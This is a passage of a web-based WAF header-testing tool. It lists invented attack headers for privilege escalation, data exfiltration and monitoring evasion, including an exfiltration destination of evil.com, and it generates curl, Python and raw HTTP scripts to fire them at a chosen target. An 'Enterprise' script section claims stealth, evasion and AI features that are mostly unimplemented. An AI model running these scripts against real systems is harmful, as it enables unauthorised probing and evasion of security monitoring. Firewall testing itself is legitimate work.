                payload: "X-Token-Privileges: SeDebugPrivilege,SeTcbPrivilege",
                severity: "critical"
            },
            {
                name: "Admin Context",
                description: "Administrative context",
                payload: "X-Admin-Context: full",
                severity: "high"
            },
            {
                name: "Privilege Bypass",
                description: "General privilege bypass",
                payload: "X-Bypass-Privileges: true",
                severity: "high"
            },
            {
                name: "Elevation Method",
                description: "Elevation method override",
                payload: "X-Elevation-Method: direct",
                severity: "high"
            },
            {
                name: "Authority Level",
                description: "Authority level manipulation",
                payload: "X-Authority-Level: maximum",
                severity: "high"
            },
            {
                name: "Admin Flag",
                description: "Simple admin flag",
                payload: "X-Is-Admin: true",
                severity: "critical"
            },
            {
                name: "Superuser Mode",
                description: "Superuser mode activation",
                payload: "X-Superuser-Mode: enabled",
                severity: "critical"
            }
        ]
    },
    "Data Exfiltration": {
        icon: "fa-download",
        tests: [
            {
                name: "Export Size Limit",
                description: "Export size bypass",
                payload: "X-Export-Limit: unlimited",
                severity: "high"
            },
            {
                name: "Download Token",
                description: "Download token manipulation",
                payload: "X-Download-Token: admin-token",
                severity: "high"
            },
            {
                name: "Batch Export",
                description: "Batch export bypass",
                payload: "X-Batch-Export: all-records",
                severity: "high"
            },
            {
                name: "Data Format",
                description: "Data format manipulation",
                payload: "X-Export-Format: raw-database",
                severity: "high"
            },
            {
                name: "Compression Bomb",
                description: "Compression bomb setup",
                payload: "X-Compression-Ratio: 1000000:1",
                severity: "medium"
            },
            {
                name: "Stream Bypass",
                description: "Streaming limit bypass",
                payload: "X-Stream-Limit: none",
                severity: "medium"
            },
            {
                name: "Backup Access",
                description: "Backup file access",
                payload: "X-Backup-Access: granted",
                severity: "critical"
            },
            {
                name: "Archive Access",
                description: "Archive access bypass",
                payload: "X-Archive-Access: historical-data",
                severity: "high"
            },
            {
                name: "Report Generation",
                description: "Report generation bypass",
                payload: "X-Report-Type: full-database-dump",
                severity: "high"
            },
            {
                name: "Query Limit",
                description: "Query limit bypass",
                payload: "X-Query-Limit: -1",
                severity: "high"
            },
            {
                name: "Result Set Size",
                description: "Result set manipulation",
                payload: "X-Max-Results: 999999999",
                severity: "high"
            },
            {
                name: "Export Queue",
                description: "Export queue bypass",
                payload: "X-Queue-Priority: immediate",
                severity: "medium"
            },
            {
                name: "Data Masking",
                description: "Data masking bypass",
                payload: "X-Mask-Sensitive: false",
                severity: "critical"
            },
            {
                name: "Encryption Bypass",
                description: "Encryption requirement bypass",
                payload: "X-Require-Encryption: false",
                severity: "high"
            },
            {
                name: "Audit Trail",
                description: "Audit trail bypass",
                payload: "X-Skip-Audit: true",
                severity: "high"
            },
            {
                name: "Data Classification",
                description: "Classification override",
                payload: "X-Data-Classification: public",
                severity: "high"
            },
            {
                name: "Export Permission",
                description: "Export permission bypass",
                payload: "X-Export-Permission: granted",
                severity: "high"
            },
            {
                name: "Bandwidth Limit",
                description: "Bandwidth limit bypass",
                payload: "X-Bandwidth-Limit: unlimited",
                severity: "medium"
            },
            {
                name: "Schedule Override",
                description: "Schedule restriction bypass",
                payload: "X-Schedule-Override: true",
                severity: "medium"
            },
            {
                name: "Retention Policy",
                description: "Retention policy bypass",
                payload: "X-Ignore-Retention: true",
                severity: "high"
            },
            {
                name: "Privacy Filter",
                description: "Privacy filter bypass",
                payload: "X-Privacy-Filter: disabled",
                severity: "critical"
            },
            {
                name: "Compliance Check",
                description: "Compliance check bypass",
                payload: "X-Compliance-Check: skip",
                severity: "high"
            },
            {
                name: "Export Approval",
                description: "Approval workflow bypass",
                payload: "X-Export-Approved: true",
                severity: "high"
            },
            {
                name: "Data Scope",
                description: "Data scope expansion",
                payload: "X-Data-Scope: global",
                severity: "high"
            },
            {
                name: "Time Range",
                description: "Time range manipulation",
                payload: "X-Time-Range: all-time",
                severity: "medium"
            },
            {
                name: "Field Selection",
                description: "Field selection bypass",
                payload: "X-Include-Fields: *",
                severity: "high"
            },
            {
                name: "Export Destination",
                description: "Export destination override",
                payload: "X-Export-Destination: http://evil.com",
                severity: "high"
            },
            {
                name: "Chunk Size",
                description: "Chunk size manipulation",
                payload: "X-Chunk-Size: 1GB",
                severity: "medium"
            },
            {
                name: "Parallel Export",
                description: "Parallel export threads",
                payload: "X-Parallel-Exports: 100",
                severity: "medium"
            },
            {
                name: "Export Metadata",
                description: "Metadata inclusion",
                payload: "X-Include-Metadata: all",
                severity: "medium"
            }
        ]
    },
    "Monitoring Evasion": {
        icon: "fa-eye-slash",
        tests: [
            {
                name: "Logging Disable",
                description: "Disable request logging",
                payload: "X-Log-Request: false",
                severity: "high"
            },
            {
                name: "Audit Bypass",
                description: "Audit trail bypass",
                payload: "X-Audit-Enabled: false",
                severity: "high"
            },
            {
                name: "Metrics Skip",
                description: "Skip metrics collection",
                payload: "X-Skip-Metrics: true",
                severity: "medium"
            },
            {
                name: "Trace Disable",
                description: "Disable distributed tracing",
                payload: "X-Trace-Enabled: false",
                severity: "medium"
            },
            {
                name: "Alert Suppress",
                description: "Suppress security alerts",
                payload: "X-Suppress-Alerts: true",
                severity: "high"
            },
            {
                name: "SIEM Bypass",
                description: "SIEM event bypass",
                payload: "X-SIEM-Forward: false",
                severity: "high"
            },
            {
                name: "WAF Logging",
                description: "WAF log bypass",
                payload: "X-WAF-Log: disabled",
                severity: "medium"
            },
            {
                name: "IDS Evasion",
                description: "IDS detection bypass",
                payload: "X-IDS-Bypass: true",
                severity: "high"
            },
            {
                name: "Rate Limit Skip",
                description: "Rate limit monitoring skip",
                payload: "X-Skip-Rate-Limit: true",
                severity: "medium"
            },
            {
                name: "Session Recording",
                description: "Session recording bypass",
                payload: "X-Record-Session: false",
                severity: "medium"
            },
            {
                name: "Debug Logs",
                description: "Debug logging disable",
                payload: "X-Debug-Log: false",
                severity: "medium"
            },
            {
                name: "Error Tracking",
                description: "Error tracking bypass",
                payload: "X-Track-Errors: false",
                severity: "medium"
            },
            {
                name: "Performance Monitor",
                description: "Performance monitoring skip",
                payload: "X-Perf-Monitor: disabled",
                severity: "low"
            },
            {
                name: "Analytics Skip",
                description: "Analytics collection bypass",
                payload: "X-Analytics: disabled",
                severity: "low"
            },
            {
                name: "Telemetry Disable",
                description: "Telemetry collection bypass",
                payload: "X-Telemetry: false",
                severity: "low"
            },
            {
                name: "Compliance Log",
                description: "Compliance logging bypass",
                payload: "X-Compliance-Log: skip",
                severity: "high"
            },
            {
                name: "Access Log",
                description: "Access log bypass",
                payload: "X-Access-Log: disabled",
                severity: "high"
            },
            {
                name: "Security Event",
                description: "Security event bypass",
                payload: "X-Security-Event: ignore",
                severity: "high"
            },
            {
                name: "Threat Detection",
                description: "Threat detection bypass",
                payload: "X-Threat-Detection: disabled",
                severity: "high"
            },
            {
                name: "Anomaly Detection",
                description: "Anomaly detection bypass",
                payload: "X-Anomaly-Detection: false",
                severity: "medium"
            },
            {
                name: "Forensics Skip",
                description: "Forensic logging bypass",
                payload: "X-Forensics: disabled",
                severity: "high"
            },
            {
                name: "Incident Response",
                description: "Incident response bypass",
                payload: "X-IR-Enabled: false",
                severity: "high"
            },
            {
                name: "Monitoring Agent",
                description: "Monitoring agent bypass",
                payload: "X-Agent-Enabled: false",
                severity: "medium"
            },
            {
                name: "Log Level",
                description: "Log level manipulation",
                payload: "X-Log-Level: none",
                severity: "medium"
            },
            {
                name: "Event Sampling",
                description: "Event sampling bypass",
                payload: "X-Sample-Rate: 0",
                severity: "medium"
            },
            {
                name: "Correlation ID",
                description: "Correlation ID bypass",
                payload: "X-Correlation-ID: do-not-track",
                severity: "low"
            },
            {
                name: "Transaction Trace",
                description: "Transaction tracing bypass",
                payload: "X-Transaction-Trace: disabled",
                severity: "medium"
            },
            {
                name: "APM Bypass",
                description: "APM monitoring bypass",
                payload: "X-APM-Enabled: false",
                severity: "medium"
            },
            {
                name: "Log Retention",
                description: "Log retention bypass",
                payload: "X-Log-Retention: 0",
                severity: "medium"
            },
            {
                name: "Archive Skip",
                description: "Log archival bypass",
                payload: "X-Archive-Logs: false",
                severity: "medium"
            }
        ]
    }
};
        // Initialize the interface
        function init() {
            populateFilters();
            renderTests();
            updateCounts();
        }

        // Populate filter dropdowns
        function populateFilters() {
            const categoryFilter = document.getElementById('categoryFilter');
            Object.keys(testDatabase).forEach(category => {
                const option = document.createElement('option');
                option.value = category;
                option.textContent = category;
                categoryFilter.appendChild(option);
            });
        }

        // Render all tests
        function renderTests() {
            const container = document.getElementById('testContainer');
            container.innerHTML = '';
            
            Object.keys(testDatabase).forEach(categoryName => {
                const category = testDatabase[categoryName];
                const categoryDiv = document.createElement('div');
                categoryDiv.className = 'bg-white rounded-lg shadow-sm border border-gray-200 p-6 fade-in';
                categoryDiv.dataset.category = categoryName;
                
                categoryDiv.innerHTML = `
                    <div class="flex items-center justify-between mb-4">
                        <h3 class="text-lg font-semibold flex items-center">
                            <i class="fas ${category.icon} text-gray-400 mr-2"></i>
                            ${categoryName}
                        </h3>
                        <span class="text-sm text-gray-500">${category.tests.length} tests</span>
                    </div>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
                        ${category.tests.map((test, index) => `
                            <div class="test-item card-hover rounded-lg p-4 cursor-pointer"
                                 data-category="${categoryName}"
                                 data-index="${index}"
                                 data-severity="${test.severity}"
                                 onclick="toggleTest(this)">
                                <div class="flex items-start">
                                    <input type="checkbox" class="mt-1 mr-3 test-checkbox" 
                                           onclick="event.stopPropagation()">
                                    <div class="flex-1">
                                        <h4 class="font-medium text-gray-900">${test.name}</h4>
                                        <p class="text-sm text-gray-600 mt-1">${test.description}</p>
                                        <div class="flex items-center mt-2 space-x-2">
                                            <span class="text-xs px-2 py-1 rounded-full severity-${test.severity}">
                                                ${test.severity.toUpperCase()}
                                            </span>
                                            <code class="text-xs text-gray-500 truncate" style="max-width: 200px;">
                                                ${escapeHtml(test.payload)}
                                            </code>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                `;
                
                container.appendChild(categoryDiv);
            });
        }

        // Toggle test selection
        function toggleTest(element) {
            const checkbox = element.querySelector('.test-checkbox');
            checkbox.checked = !checkbox.checked;
            element.classList.toggle('test-selected', checkbox.checked);
            updateCounts();
        }

        // Update selected counts
        function updateCounts() {
            const total = document.querySelectorAll('.test-checkbox').length;
            const selected = document.querySelectorAll('.test-checkbox:checked').length;
            
            document.getElementById('totalCount').textContent = total;
            document.getElementById('selectedCount').textContent = selected;
            document.getElementById('selectedBadge').textContent = selected;
        }

        // Select presets
        function selectPreset(preset) {
            clearAll();
            
            const presets = {
                critical: () => document.querySelectorAll('[data-severity="critical"]'),
                common: () => {
                    const categories = ['HTTP Response Splitting', 'SQL Injection', 'Command Injection'];
                    return document.querySelectorAll(categories.map(c => `[data-category="${c}"]`).join(','));
                },
                comprehensive: () => document.querySelectorAll('.test-item'),
                quick: () => {
                    const items = Array.from(document.querySelectorAll('.test-item'));
                    return items.slice(0, 10);
                }
            };
            
            const items = presets[preset]();
            items.forEach(item => {
                const checkbox = item.querySelector('.test-checkbox');
                if (checkbox) {
                    checkbox.checked = true;
                    item.classList.add('test-selected');
                }
            });
            
            updateCounts();
        }

        // Select all tests
        function selectAll() {
            document.querySelectorAll('.test-item').forEach(item => {
                item.querySelector('.test-checkbox').checked = true;
                item.classList.add('test-selected');
            });
            updateCounts();
        }

        // Clear all selections
        function clearAll() {
            document.querySelectorAll('.test-item').forEach(item => {
                item.querySelector('.test-checkbox').checked = false;
                item.classList.remove('test-selected');
            });
            updateCounts();
        }

        // Filter tests
        function filterTests() {
            const search = document.getElementById('searchBox').value.toLowerCase();
            const categoryFilter = document.getElementById('categoryFilter').value;
            const severityFilter = document.getElementById('severityFilter').value;
            
            document.querySelectorAll('.test-item').forEach(item => {
                const category = item.dataset.category;
                const severity = item.dataset.severity;
                const text = item.textContent.toLowerCase();
                
                let show = true;
                
                if (search && !text.includes(search)) show = false;
                if (categoryFilter && category !== categoryFilter) show = false;
                if (severityFilter && severity !== severityFilter) show = false;
                
                item.style.display = show ? 'block' : 'none';
            });
            
            // Hide empty categories
            document.querySelectorAll('[data-category]').forEach(cat => {
                const hasVisible = cat.querySelector('.test-item[style*="block"]');
                cat.style.display = hasVisible ? 'block' : 'none';
            });
        }

        // Generate commands
        function generateCommands() {
            const selected = getSelectedTests();
            if (selected.length === 0) {
                alert('Please select at least one test');
                return;
            }
            
            const targetUrl = document.getElementById('targetUrl').value;
            const proxyUrl = document.getElementById('proxyUrl').value;
            const format = document.getElementById('outputFormat').value;
            
            let output = '';
            
            switch (format) {
                case 'curl':
                    output = generateCurlCommands(selected, targetUrl, proxyUrl);
                    break;
                case 'python':
                    output = generatePythonScript(selected, targetUrl);
                    break;
                case 'raw':
                    output = generateRawHttp(selected, targetUrl);
                    break;
            }
            
            document.getElementById('outputContent').textContent = output;
            document.getElementById('outputModal').classList.remove('hidden');
        }

        // Get selected tests
        function getSelectedTests() {
            const selected = [];
            document.querySelectorAll('.test-checkbox:checked').forEach(checkbox => {
                const item = checkbox.closest('.test-item');
                const category = item.dataset.category;
                const index = parseInt(item.dataset.index);
                const test = testDatabase[category].tests[index];
                selected.push({ category, test });
            });
            return selected;
        }

        // Generate cURL commands with proper escaping
        function generateCurlCommands(tests, targetUrl, proxyUrl) {
            let commands = `#!/bin/bash
# WAF Header Attack Testing Script
# Generated: ${new Date().toISOString()}
# Target: ${targetUrl}
# Total Tests: ${tests.length}

TARGET="${targetUrl}"
${proxyUrl ? `PROXY="-x ${proxyUrl}"` : 'PROXY=""'}
LOGFILE="waf_test_$(date +%Y%m%d_%H%M%S).log"

echo "Starting WAF Header Attack Tests..." | tee $LOGFILE
echo "Target: $TARGET" | tee -a $LOGFILE
echo "===========================================" | tee -a $LOGFILE

`;
            
            tests.forEach(({ category, test }, index) => {
                commands += `# Test ${index + 1}: ${category} - ${test.name}
echo -e "\\n[TEST ${index + 1}] ${test.name}" | tee -a $LOGFILE
echo "[DESCRIPTION] ${test.description}" | tee -a $LOGFILE
echo "[SEVERITY] ${test.severity.toUpperCase()}" | tee -a $LOGFILE

`;
                
                // Format the curl command with proper escaping
                let curlCmd = `curl -v $PROXY "$TARGET"`;
                
                // Handle the payload - escape for bash double quotes
                let payload = test.payload;
                
                // First, escape existing backslashes and double quotes
                payload = payload.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
                
                // Add the header
                if (payload.includes(':')) {
                    curlCmd += ` -H "${payload}"`;
                } else {
                    curlCmd += ` --data-raw "${payload}"`;
                }
                
                commands += `${curlCmd} 2>&1 | tee -a $LOGFILE
echo "-------------------------------------------" | tee -a $LOGFILE

`;
            });
            
            commands += `echo -e "\\nTesting complete. Results saved to: $LOGFILE"
echo "Total tests executed: ${tests.length}"
`;
            
            return commands;
        }

        // Generate Python script
        function generatePythonScript(tests, targetUrl) {
            let script = `#!/usr/bin/env python3
"""
WAF Header Attack Testing Script
Generated: ${new Date().toISOString()}
Target: ${targetUrl}
"""

import requests
import urllib3
import json
import sys
from datetime import datetime

# Disable SSL warnings
urllib3.disable_warnings()

TARGET_URL = "${targetUrl}"
RESULTS = []

def test_payload(category, test_name, description, headers, severity):
    """Test a single payload against the target"""
    print(f"\\n[*] Testing: {test_name}")
    print(f"    Category: {category}")
    print(f"    Severity: {severity.upper()}")
    
    try:
        response = requests.get(
            TARGET_URL,
            headers=headers,
            verify=False,
            timeout=10,
            allow_redirects=False
        )
        
        result = {
            "category": category,
            "test": test_name,
            "description": description,
            "severity": severity,
            "status_code": response.status_code,
            "blocked": False,
            "headers_sent": headers,
            "response_headers": dict(response.headers)
        }
        
        print(f"    [+] Status Code: {response.status_code}")
        
    except Exception as e:
        result = {
            "category": category,
            "test": test_name,
            "description": description,
            "severity": severity,
            "error": str(e),
            "blocked": True,
            "headers_sent": headers
        }
        
        print(f"    [-] Error/Blocked: {str(e)[:50]}...")
    
    RESULTS.append(result)
    return result

# Test Payloads
print(f"[*] Starting WAF Header Attack Tests")
print(f"[*] Target: {TARGET_URL}")
print(f"[*] Time: {datetime.now()}")
print("=" * 60)

`;

            tests.forEach(({ category, test }) => {
                // Parse headers from payload
                let headers = {};
                const lines = test.payload.split('\\r\\n').filter(l => l);
                
                lines.forEach(line => {
                    if (line.includes(':')) {
                        const [name, ...valueParts] = line.split(':');
                        headers[name.trim()] = valueParts.join(':').trim();
                    }
                });
                
                // Handle special cases where payload is just a header
                if (test.payload.includes(':') && !test.payload.includes('\\r\\n')) {
                    const [name, ...valueParts] = test.payload.split(':');
                    headers = { [name.trim()]: valueParts.join(':').trim() };
                }
                
                script += `
# ${category} - ${test.name}
test_payload(
    category="${category}",
    test_name="${test.name}",
    description="${test.description}",
    headers=${JSON.stringify(headers, null, 4).replace(/\n/g, '\n    ')},
    severity="${test.severity}"
)
`;
            });

            script += `
# Generate Report
print("\\n" + "=" * 60)
print(f"[*] Testing Complete!")
print(f"[*] Total Tests: {len(RESULTS)}")
print(f"[*] Blocked: {sum(1 for r in RESULTS if r.get('blocked', False))}")

# Save results
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
filename = f"waf_test_results_{timestamp}.json"

with open(filename, 'w') as f:
    json.dump({
        "target": TARGET_URL,
        "timestamp": datetime.now().isoformat(),
        "total_tests": len(RESULTS),
        "results": RESULTS
    }, f, indent=2)

print(f"\\n[*] Results saved to: {filename}")

# Summary by severity
severity_stats = {}
for result in RESULTS:
    sev = result.get('severity', 'unknown')
    if sev not in severity_stats:
        severity_stats[sev] = {'total': 0, 'blocked': 0}
    severity_stats[sev]['total'] += 1
    if result.get('blocked', False):
        severity_stats[sev]['blocked'] += 1

print("\\n[*] Summary by Severity:")
for sev, stats in sorted(severity_stats.items()):
    print(f"    {sev.upper()}: {stats['total']} total, {stats['blocked']} blocked")
`;

            return script;
        }

        // Generate raw HTTP requests
        function generateRawHttp(tests, targetUrl) {
            const url = new URL(targetUrl);
            let requests = '';
            
            tests.forEach(({ category, test }, index) => {
                requests += `# Test ${index + 1}: ${category} - ${test.name}
# ${test.description}
# Severity: ${test.severity.toUpperCase()}

GET ${url.pathname || '/'} HTTP/1.1\r
Host: ${url.hostname}\r
${test.payload.replace(/\\r\\n/g, '\r\n').replace(/\\n/g, '\n').replace(/\\t/g, '\t').replace(/\\x([0-9A-Fa-f]{2})/g, (match, hex) => String.fromCharCode(parseInt(hex, 16)))}\r
User-Agent: WAF-Tester/1.0\r
Accept: */*\r
Connection: close\r
\r

${'='.repeat(80)}

`;
            });
            
            return requests;
        }

        // Copy commands to clipboard
        function copyCommands() {
            const content = document.getElementById('outputContent').textContent;
            navigator.clipboard.writeText(content).then(() => {
                const btn = event.target.closest('button');
                const originalText = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-check mr-1"></i>Copied!';
                btn.classList.add('bg-green-100', 'text-green-700');
                setTimeout(() => {
                    btn.innerHTML = originalText;
                    btn.classList.remove('bg-green-100', 'text-green-700');
                }, 2000);
            });
        }

        // Download commands
        function downloadCommands() {
            const content = document.getElementById('outputContent').textContent;
            const format = document.getElementById('outputFormat').value;
            const extensions = { curl: 'sh', python: 'py', raw: 'txt' };
            const filename = `waf_tests_${new Date().getTime()}.${extensions[format]}`;
            
            const blob = new Blob([content], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            a.click();
            window.URL.revokeObjectURL(url);
        }

        // Close modal
        function closeModal() {
            document.getElementById('outputModal').classList.add('hidden');
        }

        // Show help
        function showHelp() {
            alert(`WAF Header Attack Testing Suite - Help

1. Select tests by clicking on them or using preset buttons
2. Configure your target URL and optional proxy
3. Choose output format (cURL, Python, or Raw HTTP)
4. Click "Generate Commands" to create test scripts
5. Copy or download the generated commands

Severity Levels:
- Critical: High-impact vulnerabilities
- High: Significant security risks
- Medium: Moderate concerns
- Low: Minor issues

For support, visit: github.com/your-repo`);
        }

        // Escape HTML
        function escapeHtml(text) {
            const map = {
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#039;'
            };
            return text.replace(/[&<>"']/g, m => map[m]);
        }

        // Initialize on load
        document.addEventListener('DOMContentLoaded', init);
    </script>









<script>
// Professional WAF Security Assessment Platform v5.0 - Enterprise Edition
(function() {
    // Enhanced button with professional styling
    function addPythonTestButton() {
        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = `
            position: fixed;
            bottom: 80px;
            right: 6px;
            z-index: 40;
        `;

        const button = document.createElement('button');
        button.innerHTML = '<i class="fas fa-rocket"></i> WAF Assessment Pro';
        button.style.cssText = `
            background: linear-gradient(135deg, #0f172a 0%, #1e40af 50%, #3b82f6 100%);
            color: white;
            border: none;
            border-radius: 12px;
            padding: 12px 20px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 8px 32px rgba(59, 130, 246, 0.3);
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s ease;
            font-size: 14px;
            letter-spacing: 0.5px;
        `;

        button.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-4px) scale(1.05)';
            this.style.boxShadow = '0 12px 40px rgba(59, 130, 246, 0.4)';
        });
        
        button.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0) scale(1)';
            this.style.boxShadow = '0 8px 32px rgba(59, 130, 246, 0.3)';
        });

        button.addEventListener('click', function() {
            generateEnterpriseWAFScript();
        });

        buttonContainer.appendChild(button);
        document.body.appendChild(buttonContainer);
    }

    function generateEnterpriseWAFScript() {
        const selected = getSelectedTests();
        if (selected.length === 0) {
            alert('Please select at least one test before generating the enterprise assessment script');
            return;
        }

        const targetUrl = document.getElementById('targetUrl').value || 'http://target.com';
        const proxyUrl = document.getElementById('proxyUrl').value || '';

        const pythonScript = createEnterpriseWAFScript(selected, targetUrl, proxyUrl);
        
        const filename = `enterprise_waf_assessment_${new Date().getTime()}.py`;
        downloadFile(pythonScript, filename, 'text/plain');
        
        document.getElementById('outputContent').textContent = pythonScript;
        document.getElementById('outputModal').classList.remove('hidden');
    }

    function downloadFile(content, filename, contentType) {
        const a = document.createElement('a');
        const file = new Blob([content], {type: contentType});
        a.href = URL.createObjectURL(file);
        a.download = filename;
        a.click();
        URL.revokeObjectURL(a.href);
    }

    function getSelectedTests() {
        const selected = [];
        document.querySelectorAll('.test-checkbox:checked').forEach(checkbox => {
            const item = checkbox.closest('.test-item');
            if (item) {
                const category = item.dataset.category;
                const index = parseInt(item.dataset.index);
                if (testDatabase[category] && testDatabase[category].tests && testDatabase[category].tests[index]) {
                    const test = testDatabase[category].tests[index];
                    selected.push({ category, test });
                }
            }
        });
        return selected;
    }

    function escapePythonString(str) {
        if (typeof str !== 'string') return str;
        return str
            .replace(/\\/g, '\\\\')
            .replace(/"/g, '\\"')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t')
            .replace(/\u0000/g, '\\0');
    }

    function escapeHtmlContent(str) {
        if (typeof str !== 'string') return str;
        return str
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;')
            .replace(/\//g, '&#x2F;');
    }

    function createEnterpriseWAFScript(tests, targetUrl, proxyUrl) {
        let script = `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enterprise WAF Security Assessment Platform v5.0
================================================
Advanced Web Application Firewall Testing with AI-powered Analysis

 ENTERPRISE FEATURES:
- AI-powered WAF detection and behavioral analysis
- Real-time dashboard with interactive charts
- Multi-threaded parallel processing
- Advanced payload mutation and encoding
- Machine learning-based pattern recognition
- Compliance reporting (OWASP, PCI-DSS, SOX)
- Threat intelligence integration
- Advanced evasion techniques
- Performance optimization and caching
- Executive reporting with risk modeling

Target: ${targetUrl}
Tests: ${tests.length}
Generated: ${new Date().toISOString()}
"""

import requests
import time
import json
import os
import random
import urllib3
import sys
import csv
import base64
import hashlib
import re
import threading
import queue
import sqlite3
from datetime import datetime, timedelta
from urllib.parse import urlparse, urljoin, quote, unquote
from dataclasses import dataclass, asdict, field
from typing import Dict, List, Optional, Tuple, Any, Set, Union
from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
import statistics
import math
import itertools
from collections import defaultdict, Counter
import pickle
import gzip
import zlib
import html
import xml.etree.ElementTree as ET
from urllib.robotparser import RobotFileParser
import socket
import ssl
import subprocess
import tempfile
import mimetypes
import uuid
from pathlib import Path

# Advanced imports for enterprise features
try:
    import numpy as np
    import matplotlib.pyplot as plt
    import seaborn as sns
    from scipy import stats
    ADVANCED_ANALYTICS = True
except ImportError:
    ADVANCED_ANALYTICS = False
    print(" Install numpy, matplotlib, seaborn, scipy for advanced analytics")

try:
    import plotly.graph_objects as go
    import plotly.express as px
    from plotly.subplots import make_subplots
    INTERACTIVE_CHARTS = True
except ImportError:
    INTERACTIVE_CHARTS = False
    print(" Install plotly for interactive charts")

try:
    from jinja2 import Template
    TEMPLATE_ENGINE = True
except ImportError:
    TEMPLATE_ENGINE = False
    print(" Install jinja2 for advanced templating")

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Enterprise Configuration
TARGET_URL = "${escapePythonString(targetUrl)}"
${proxyUrl ? `PROXY = "${escapePythonString(proxyUrl)}"` : 'PROXY = None'}
OUTPUT_DIR = f"enterprise_waf_assessment_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

class EnterpriseConfig:
    # Performance and Optimization
    MIN_DELAY = 0.5
    MAX_DELAY = 2.0
    MAX_CONSECUTIVE_REQUESTS = 8
    LONG_PAUSE = 3.0
    REQUEST_TIMEOUT = 25
    MAX_RETRIES = 5
    PARALLEL_THREADS = 6
    ENABLE_CACHING = True
    CACHE_DURATION = 3600  # 1 hour
    
    # Advanced Detection
    BLOCKED_STATUS_CODES = [303, 400, 403, 406, 409, 412, 429, 418, 503, 509, 999, 444, 494, 495, 496, 497]
    SUSPICIOUS_STATUS_CODES = [301, 302, 307, 308, 404, 405, 410, 413, 414, 431, 502, 504]
    WAF_KEYWORDS = ['blocked', 'forbidden', 'access denied', 'security', 'firewall', 'protection', 'violation', 'suspicious', 'threat', 'malicious', 'attack', 'injection']
    
    # AI and Machine Learning
    ENABLE_AI_ANALYSIS = True
    ENABLE_BEHAVIORAL_LEARNING = True
    CONFIDENCE_THRESHOLD = 0.7
    PATTERN_LEARNING_SAMPLES = 50
    
    # Advanced Features
    ENABLE_PAYLOAD_MUTATION = True
    ENABLE_TRAFFIC_SHAPING = True
    ENABLE_STEALTH_MODE = True
    ENABLE_THREAT_INTELLIGENCE = True
    ENABLE_VULNERABILITY_CORRELATION = True
    ENABLE_COMPLIANCE_REPORTING = True
    
    # Reporting and Analytics
    GENERATE_EXECUTIVE_DASHBOARD = True
    GENERATE_COMPLIANCE_REPORTS = True
    GENERATE_TREND_ANALYSIS = True
    ENABLE_REAL_TIME_MONITORING = True
    EXPORT_FORMATS = ['html', 'json', 'csv', 'pdf', 'xml']

# Create enterprise directory structure
enterprise_dirs = [
    "responses", "logs", "exports", "analysis", "intelligence", 
    "compliance", "dashboards", "cache", "models", "reports"
]
for dir_name in enterprise_dirs:
    os.makedirs(os.path.join(OUTPUT_DIR, dir_name), exist_ok=True)

# Enterprise Logging System
class EnterpriseLogger:
    def __init__(self):
        self.log_file = os.path.join(OUTPUT_DIR, "logs", "enterprise_assessment.log")
        self.error_file = os.path.join(OUTPUT_DIR, "logs", "errors.log")
        self.debug_file = os.path.join(OUTPUT_DIR, "logs", "debug.log")
        self.waf_detection_file = os.path.join(OUTPUT_DIR, "logs", "waf_detection.log")
        self.intelligence_file = os.path.join(OUTPUT_DIR, "logs", "threat_intelligence.log")
        self.performance_file = os.path.join(OUTPUT_DIR, "logs", "performance.log")
        
        # Initialize SQLite database for structured logging
        self.db_path = os.path.join(OUTPUT_DIR, "logs", "assessment.db")
        self._init_database()
    
    def _init_database(self):
        """Initialize SQLite database for structured logging"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                level TEXT,
                category TEXT,
                message TEXT,
                test_id INTEGER,
                metadata TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                test_id INTEGER,
                response_time REAL,
                response_size INTEGER,
                status_code INTEGER,
                waf_confidence REAL
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def _write_log(self, message, level, category="GENERAL", file_path=None, test_id=None, metadata=None):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        full_message = f"[{timestamp}] [{level}] [{category}] {message}"
        
        if EnterpriseConfig.VERBOSE or level in ['ERROR', 'WARNING', 'CRITICAL']:
            print(full_message)
        
        # Write to file
        if file_path:
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(full_message + "\\n")
        
        # Write to database
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO logs (timestamp, level, category, message, test_id, metadata) VALUES (?, ?, ?, ?, ?, ?)',
            (timestamp, level, category, message, test_id, json.dumps(metadata) if metadata else None)
        )
        conn.commit()
        conn.close()
    
    def info(self, message, category="INFO", test_id=None, metadata=None):
        self._write_log(message, "INFO", category, self.log_file, test_id, metadata)
    
    def error(self, message, category="ERROR", test_id=None, metadata=None):
        self._write_log(message, "ERROR", category, self.error_file, test_id, metadata)
        self._write_log(message, "ERROR", category, self.log_file, test_id, metadata)
    
    def warning(self, message, category="WARNING", test_id=None, metadata=None):
